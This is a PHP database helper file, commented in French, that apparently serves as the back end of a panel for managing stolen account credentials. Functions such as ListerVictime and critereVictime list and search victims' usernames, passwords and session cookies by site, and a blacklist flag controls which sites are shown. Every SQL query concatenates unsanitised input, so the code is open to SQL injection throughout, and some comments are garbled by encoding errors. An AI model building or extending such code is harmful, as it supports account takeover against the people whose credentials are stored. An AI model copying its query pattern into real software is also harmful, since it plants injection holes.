<?php 
	function connexionBDD(){
		include("paramCon.php");
		$dsn='pgsql:host='.$lehost.';dbname='.$dbname.';port='.$leport;
		try {
			$connex = new PDO($dsn, $user, $pass); // tentative de connexion
			
		} catch (PDOException $e) {
			print "Erreur de connexion à la base de données ! : " . $e->getMessage();
			die(); // Arr\EAt du script - sortie.
		}
		return $connex;
	}
 
	function deconnexionBDD($connex){
		$connex=null;
	}

	function ListerVictime($connex) {
		$sql="SELECT idcompte, username, pass,nom,cookie FROM COMPTES INNER JOIN SITES on  refSite = idSite where blacked = false";									// d閏laration de la variable appelee $sql.
   		$result=$connex->query($sql); 				// execution de la requ阾e. Le resultat est dans la variable $res.
		return $result;								// retourne a l'appelant le resultat.
	}

	function ListerSite($connex,$black) {
		if($black == "false"){
			$where = " where blacked = false";
		}
		else if ($black == "true") {
			$where = " where blacked = true";
		}
		else{
			$where = "";
		}
		$sql="SELECT idsite,nom,blacked FROM SITES".$where.";";		// d閏laration de la variable appelee $sql.
   		$result=$connex->query($sql); 	
   				// execution de la requ阾e. Le resultat est dans la variable $res.
		return $result;								// retourne a l'appelant le resultat.
	}

	function ListerUsername($connex) {
		$sql="SELECT username FROM COMPTES INNER JOIN SITES on refSite = idSite where blacked = false GROUP BY username ";									// d閏laration de la variable appelee $sql.
   		$result=$connex->query($sql); 				// execution de la requ阾e. Le resultat est dans la variable $res.
		return $result;								// retourne a l'appelant le resultat.
	}

	function ListerPassword($connex) {
		$sql="SELECT pass FROM COMPTES INNER JOIN SITES on refSite = idSite where blacked = false GROUP BY pass";									// d閏laration de la variable appelee $sql.
   		$result=$connex->query($sql); 				// execution de la requ阾e. Le resultat est dans la variable $res.
		return $result;								// retourne a l'appelant le resultat.
	}

	function critereVictime($connex,$site,$user,$pass,$search){
		$sql="SELECT username, pass,nom, cookie FROM COMPTES INNER JOIN SITES on refSite = idSite where blacked = false";
		if($site != "none"){
			$sql=$sql." and nom='".$site."'";
		}
		if($user != "none"){
			$sql=$sql." and username='".$user."'";
		}
		if($pass != "none"){
			$sql=$sql." and pass='".$pass."'";
		}
		if($search != "none"){
			$sql=$sql." and (username LIKE '%".$search."%' OR pass LIKE '%".$search."%' OR nom LIKE '%".$search."%')";
		}
		
   		$result=$connex->query($sql); 				
		return $result;	
	}

	function nb($connex,$aCompter){
		$sql="SELECT COUNT(*) FROM  ".$aCompter.";";									// d閏laration de la variable appelee $sql.
   		$result=$connex->query($sql); 				// execution de la requ阾e. Le resultat est dans la variable $res.
		return $result;	
                
	}

	function changeEtatBlacklist($connex,$site,$new){

		$sql='UPDATE sites SET blacked = '.$new.' WHERE idsite = '.$site.";";
		$result=$connex->query($sql); 				// execution de la requ阾e. Le resultat est dans la variable $res.
		return $result;	
	}

	function siteExiste($connex,$site){
		$sql="SELECT idSite from sites where nom='".$site."';";								// d閏laration de la variable appelee $sql.
   		$result=$connex->query($sql); 				// execution de la requ阾e. Le resultat est dans la variable $res.
		return $result;	
	}

	function ajoutSiteBlacklist($connex,$site){
			$se = siteExiste($connex,$site);
			$siteExiste = $se->fetch();
			if($siteExiste == ""){
				$sql="INSERT INTO SITES (nom,blacked) VALUES ('".$site."',true) RETURNING idSite;";
				$result=$connex->query($sql); 				
				return $result;	
				
			}
			else{
				echo '<script type="text/javascript"> alert("Erreur, le site entré existe déjà") </script>' ;
				
			}

	}
	function supprCompte($connex,$idc){
		$sql='DELETE FROM COMPTES where idcompte='.$idc.';';
		$result=$connex->query($sql); 				
		return $result;	
	}
	
	function supprSite($connex,$ids){
		$sql='DELETE FROM SITES where idsite='.$ids.';';
		$result=$connex->query($sql); 				
		return $result;	
	}

?>
